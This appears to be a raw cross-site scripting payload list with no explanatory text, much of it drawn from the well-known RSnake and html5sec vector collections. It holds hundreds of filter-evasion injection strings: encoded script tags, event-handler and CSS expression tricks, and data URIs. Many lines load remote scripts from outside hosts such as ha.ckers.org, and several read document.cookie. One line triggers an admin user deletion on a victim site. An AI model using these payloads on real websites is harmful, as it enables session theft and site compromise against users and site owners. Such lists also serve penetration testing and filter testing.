<IMG SRC="   javascript:alert('XSS');">
<iframe src=http://ha.ckers.org/scriptlet.html <
<SCRIPT SRC=//ha.ckers.org/.j>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<IMG LOWSRC="javascript:alert('XSS')">
<BR SIZE="&{alert('XSS')}">Code 39 (always URL encoded, or double encoded, otherwise it can't make the characters) 
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">

‘; alert(document.cookie); var foo=’

foo\’; alert(document.cookie);//’;

</script><script >alert(document.cookie)</script>


<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script>alert("XSS");</script>&search=1
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
<h1><font color=blue>hellox worldss</h1>
<BODY ONLOAD=alert('hellox worldss')>
<input onfocus=write(XSS) autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form><button formaction="javascript:alert(XSS)">lol
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
<div style="font-family:'foo&#10;;color:red;';">LOL
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<script>({0:#0=alert/#0#/#0#(0)})</script>
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
\\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
žscriptualert(EXSSE)ž/scriptu
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;!&#91;endif&#93;--&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
a=\"get\";
b=\"URL(\\"\";
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
eval(a+b+c+d);
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;? echo('&lt;SCR)';
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&lt;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
'';!--\"&lt;XSS&gt;=&{()}
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><button formaction="javascript:alert(123)">crosssitespt
<frameset onload=alert(123)>
<!--<img src="--><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(123)//">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="javascript:alert(1)">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script src="#">{alert(1)}</script>;1
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%253cscript%253ealert(document.cookie)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
“><ScRiPt>alert(document.cookie)</script>
“><<script>alert(document.cookie);//<</script>
foo<script>alert(document.cookie)</script>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
‘; alert(document.cookie); var foo=’
foo\’; alert(document.cookie);//’;
</script><script >alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
<BODY ONLOAD=alert(’XSS’)>
<script>alert(1)</script>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<video poster=javascript:alert(1)//></video>
<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button><video><source onerror="alert(1)"><video onerror="alert(1)"><source></source></video><form><button formaction="javascript:alert(1)">X</button><body oninput=alert(1)><input autofocus><math href="javascript:alert(1)">CLICKME</math> <math> <!-- up to FF 13 --> <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction> <!-- FF 14+ --> <maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction> </math><form action="" method="post"> <input name="username" value="admin" /> <input name="password" type="password" value="secret" /> <input name="injected" value="injected" dirname="password" /> <input type="submit"> </form><frameset onload=alert(1)><table background="javascript:alert(1)"></table><!--<img src="--><img src=x onerror=alert(1)//"><comment><img src="</comment><img src=x onerror=alert(1)//"><!-- up to Opera 11.52, FF 3.6.28 --> <![><img src="]><img src=x onerror=alert(1)//"> <!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+ --> <svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=alert(2)//"></svg><style><img src="</style><img src=x onerror=alert(1)//"><li style=list-style:url() onerror=alert(1)></li> <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div><head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body><SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed><b <script>alert(1)//</script>0</script></b><div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script><!-- IE 6-8 --> <x '="foo"><x foo='><img src=x onerror=alert(1)//'> <!-- IE 6-9 --> <! '="foo"><x foo='><img src=x onerror=alert(2)//'> <? '="foo"><x foo='><img src=x onerror=alert(3)//'><embed src="javascript:alert(1)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF <img src="javascript:alert(2)"> <image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓ <script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div><object allowscriptaccess="always" data="test.swf"></object>class XSS {public static function main() { flash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1)"),flash.Lib._root.name||"_top"); }}crossdomain: 1[A] <? foo="><script>alert(1)</script>"> <! foo="><script>alert(1)</script>"> </ foo="><script>alert(1)</script>"> [B] <? foo="><x foo='?><script>alert(1)</script>'>"> [C] <! foo="[[[x]]"><x foo="]foo><script>alert(1)</script>"> [D] <% foo><x foo="%><script>alert(1)</script>"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe> <iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe><html> <body> <b>some content without two new line \n\n</b> Content-Type: multipart/related; boundary="******"<b>some content without two new line</b> --****** Content-Location: xss.html Content-Transfer-Encoding: base64 PGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1 cmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9 dXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy YW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg --******-- </body> </html><!-- IE 5-9 --> <div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML+='';</script> <!-- IE 10 in IE5-9 Standards mode --> <div id=d><x xmlns='"><iframe onload=alert(2)//'></div> <script>d.innerHTML+='';<img src onerror /" '"= alt=alert(1)//"><title onpropertychange=alert(1)></title><title title=></title><!-- IE 5-8 standards mode --> <a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=alert(1)></a>"> <!-- IE 5-9 standards mode --> <!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//"> <?a foo=x=`y><img alt="`><img src=xx:x onerror=alert(3)//"><!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(2)//]> --><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10 <script src="\\example.com\foo.js"></script> // Safari 5.0<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object><!-- `<img/src=xx:xx onerror=alert(1)//--!><xmp> <% </xmp> <img alt='%></xmp><img src=xx:x onerror=alert(1)//'> <script> x='<%' </script> %>/ alert(2) </script> XXX <style> *['<!--']{} </style> -->{} *{color:red}</style><a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a><style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{back<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d<style>@import "data:,*%7bx:expression(write(1))%7D";</style><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a><style>*[{}@import'test.css?]{color: green;}</style>X* {-o-link:'javascript:alert(1)';-o-link-source: current;}<div style="font-family:'foo[a];color:red;';">XXX</div><div style="font-family:foo}color=red;">XXX</div><div style="[a]color[b]:[c]red">XXX</div><div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div><// style=x:expr<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style><!-- Up to Opera 10.63 --> <div style=content:url(test2.svg)></div> <!-- Up to Opera 11.64 - see link below --> 